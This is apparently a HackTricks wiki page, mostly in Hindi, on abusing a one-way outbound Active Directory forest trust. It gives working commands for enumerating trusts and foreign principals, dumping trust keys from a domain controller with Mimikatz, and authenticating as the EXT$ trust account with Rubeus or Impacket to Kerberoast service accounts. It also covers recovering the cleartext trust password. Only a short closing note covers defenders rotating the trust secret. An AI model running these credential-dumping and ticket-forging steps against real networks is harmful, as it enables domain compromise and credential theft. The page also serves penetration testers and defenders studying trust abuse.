# External Forest Domain - One-Way (Outbound)

{{#include ../../banners/hacktricks-training.md}}

इस scenario में **आपका domain**, किसी **दूसरे domain/forest** के principals को कुछ **privileges** दे रहा है।

## Enumeration

### Outbound Trust
```bash
# Notice Outbound trust
Get-DomainTrust
SourceName      : root.local
TargetName      : ext.local
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM

# Lets find the current domain group giving permissions to the external domain
Get-DomainForeignGroupMember
GroupDomain             : root.local
GroupName               : External Users
GroupDistinguishedName  : CN=External Users,CN=Users,DC=DOMAIN,DC=LOCAL
MemberDomain            : root.io
MemberName              : S-1-5-21-1028541967-2937615241-1935644758-1115
MemberDistinguishedName : CN=S-1-5-21-1028541967-2937615241-1935644758-1115,CN=ForeignSecurityPrincipals,DC=DOMAIN,DC=LOCAL
## Note how the members aren't from the current domain (ConvertFrom-SID won't work)
```
यदि आपके पास AD module उपलब्ध है, तो **Trusted Domain Object (TDO)** का सीधे निरीक्षण भी करें। इससे आपको raw LDAP-backed trust data मिलता है, जिसकी बाद में यह तय करते समय आवश्यकता होगी कि आसान रास्ता **FSP/group abuse** है या **trust-account abuse**:
```powershell
# Enumerate the TDO created for the foreign forest/domain
Get-ADObject -LDAPFilter '(objectClass=trustedDomain)' -SearchBase "CN=System,$((Get-ADDomain).DistinguishedName)" -Properties trustDirection,trustType,trustAttributes,flatName,securityIdentifier,whenCreated,whenChanged |
Select Name,flatName,trustDirection,trustType,trustAttributes,securityIdentifier,whenCreated,whenChanged

# Fast trust hygiene check from the outbound side
Get-ADTrust -Identity ext.local -Properties ForestTransitive,SelectiveAuthentication,SIDFilteringQuarantined,SIDFilteringForestAware,TGTDelegation
```
आपको यह भी सूचीबद्ध करना चाहिए कि `CN=ForeignSecurityPrincipals` के foreign principals को वास्तव में कहाँ access दिया गया था। सामान्यतः महत्वपूर्ण स्थान हैं:

- आपके वर्तमान domain के किसी server/DC पर **Local admin**
- ऐसे **custom domain group** की membership, जिसके पास users/computers/GPOs पर ACLs हों
- **computer objects** को modify करने के rights, जो trust configuration इसकी अनुमति देने पर बाद में [RBCD](resource-based-constrained-delegation.md) बन सकते हैं

## Trust Account Attack

जब domain/forest **B** से domain/forest **A** के लिए one-way trust बनाया जाता है (**B trusts A**), तो **B** के लिए एक **trust account** **A** में बनाया जाता है। **A** के outbound-trust view में यह उपयोगी है क्योंकि यदि बाद में आप **B** (trusting side) को compromise कर लेते हैं, तो वहाँ से trust secret dump करके `B$` के रूप में **A** में वापस authenticate कर सकते हैं।<sup>[[1]](#references)</sup>

यहाँ समझने योग्य महत्वपूर्ण पहलू यह है कि उस trust account का password और Kerberos material **trusting** domain के Domain Controller से निम्न का उपयोग करके extract किया जा सकता है:<sup>[[1]](#references)</sup>
```bash
Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
```
यह इसलिए काम करता है क्योंकि **trusted** domain में बनाया गया trust account एक enabled principal होता है, जिसे वहां एक सामान्य domain user के baseline rights मिल जाते हैं। यह अक्सर LDAP enumeration शुरू करने, tickets request करने और अगला escalation path खोजने के लिए पर्याप्त होता है।<sup>[[1]](#references)</sup>

ऐसे scenario में जहां `ext.local` **trusting** domain है और `root.local` **trusted** domain है, `root.local` के अंदर `EXT$` नाम का एक user account बनाया जाता है। `ext.local` से trust keys dump करने पर ऐसी credentials मिलती हैं जिनका उपयोग `root.local` के विरुद्ध `root.local\EXT$` के रूप में किया जा सकता है:<sup>[[1]](#references)</sup>
```bash
lsadump::trust /patch
```
इसके बाद, निकाली गई **RC4** key का उपयोग `root.local` के अंदर `root.local\EXT$` के रूप में authenticate करने के लिए करें:<sup>[[1]](#references)</sup>
```bash
.\Rubeus.exe asktgt /user:EXT$ /domain:root.local /rc4:<RC4> /dc:dc.root.local /ptt
```
फिर उस principal के रूप में trusted domain को enumerate करें, उदाहरण के लिए `root.local` में किसी high-value SPN का Kerberoasting करके:<sup>[[1]](#references)</sup>
```bash
.\Rubeus.exe kerberoast /user:svc_sql /domain:root.local /dc:dc.root.local
```
### Linux से

यदि आपने **RC4** trust-account key प्राप्त कर लिया है, तो यही तरीका Linux से Impacket के साथ काम करता है:
```bash
python getTGT.py -dc-ip dc.root.local root.local/EXT\$ -hashes :<RC4>
export KRB5CCNAME=EXT\$.ccache

# Kerberoast from the trusted domain as the trust account
GetUserSPNs.py -request -k -no-pass -dc-ip dc.root.local root.local/EXT\$ -outputfile root_spns.kerberoast

# Or reduce noise and request only one user
GetUserSPNs.py -request-user svc_sql -k -no-pass -dc-ip dc.root.local root.local/EXT\$
```
यदि **RC4** स्वीकार नहीं किया जाता है, तो recovered **cleartext password** (या derived **AES** keys) पर fallback करें और उस foothold से सामान्य [Over-Pass-the-Hash / Pass-the-Key](over-pass-the-hash-pass-the-key.md) तथा [Kerberoast](kerberoast.md) workflows का पुनः उपयोग करें।

### Key material gotchas

**trust keys** और **trust-account credentials** को आपस में न मिलाएँ:<sup>[[1]](#references)</sup>

- One-way trust में दोनों पक्ष एक **TDO** store करते हैं, लेकिन वास्तविक **`EXT$` user account केवल trusted domain में मौजूद होता है**।
- वर्तमान trust-account password, TDO trust secret (`NewPassword` / current trust key) में reflected होता है।
- **RC4** trust key, trust account के रूप में `asktgt` के लिए reuse करने योग्य सबसे आसान artifact है; default setups में यह आमतौर पर working enctype होता है, क्योंकि trust account में अक्सर blank `msDS-SupportedEncryptionTypes` होता है।
- यदि आप **AES trust keys** के संदर्भ में सोच रहे हैं, तो याद रखें कि ये trust-account AES keys के साथ interchangeable नहीं हैं, क्योंकि उनके salts अलग होते हैं।

इसलिए, इस technique के लिए dumped **RC4** material या recovered **cleartext** password में से किसी एक को प्राथमिकता दें।<sup>[[1]](#references)</sup>

### Gathering cleartext trust password

पिछले flow में **cleartext password** के बजाय trust hash का उपयोग किया गया था (इसे **mimikatz द्वारा भी dump किया जाता है**)।<sup>[[1]](#references)</sup>

Cleartext password, mimikatz के \[ CLEAR ] output को hexadecimal से convert करके और null bytes `\x00` हटाकर प्राप्त किया जा सकता है:<sup>[[1]](#references)</sup>

![Trust Account Attack - Gathering cleartext trust password: mimikatz के ( CLEAR ) output को hexadecimal से convert करके और null bytes हटाकर cleartext password प्राप्त किया जा सकता है...](<../../images/image (938).png>)

कभी-कभी trust relationship बनाते समय user को trust के लिए password type करना पड़ता है। इस demonstration में key original trust password है और इसलिए human readable है। जैसे-जैसे key rotate होती है (default: हर 30 days), cleartext आमतौर पर human readable नहीं रहता, लेकिन technically usable रहता है।<sup>[[1]](#references)</sup>

Cleartext password का उपयोग trust account के रूप में regular authentication करने के लिए किया जा सकता है। यह trust account की Kerberos secret key से TGT request करने का एक alternative है। यहाँ, `ext.local` से `root.local` में `Domain Admins` के members query किए जा रहे हैं:<sup>[[1]](#references)</sup>

![Trust Account Attack - Gathering cleartext trust password: Cleartext password का उपयोग trust account के रूप में regular authentication करने के लिए किया जा सकता है, जो TGT request करने का एक alternative है...](<../../images/image (792).png>)

### Practical limitations

> [!WARNING]
> Trust accounts awkward principals होते हैं। **RUNAS / console / RDP** जैसे interactive logons यहाँ expected path नहीं हैं, और **NTLM** authentication attempts `STATUS_NOLOGON_INTERDOMAIN_TRUST_ACCOUNT` के साथ fail हो सकते हैं। इसके बजाय **Kerberos network logons** (`asktgt`, LDAP, CIFS, Kerberoast) की योजना बनाएँ।<sup>[[1]](#references)</sup>

### Persistence / cleanup note

यदि defenders को पता चलता है कि trusting domain compromise हो चुका है, तो उन्हें `netdom trust ... /resetOneSide ...` के साथ **दोनों sides** पर trust secret rotate करना चाहिए। Operator के perspective से यह महत्वपूर्ण है, क्योंकि एक **manual reset पुराने trust material को तुरंत invalid कर देता है**, जबकि normal trust-password rotation rollover के दौरान current/previous values को बनाए रखती है।<sup>[[2]](#references)</sup>
```bash
# Run once from the trusted side
netdom trust root.local /domain:ext.local /resetOneSide /passwordT:<NEWPASS> /userO:administrator /passwordO:*

# Run once from the trusting side
netdom trust ext.local /domain:root.local /resetOneSide /passwordT:<NEWPASS> /userO:administrator /passwordO:*
```
## संदर्भ

- [1] [डोमेन के बीच सुरक्षा सीमा के रूप में SID filter? (भाग 7) – Trust account attack – trusting से trusted तक](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-7)
- [2] [AD Forest Recovery – trust password को reset करना](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/forest-recovery-guide/ad-forest-recovery-reset-trust)

{{#include ../../banners/hacktricks-training.md}}
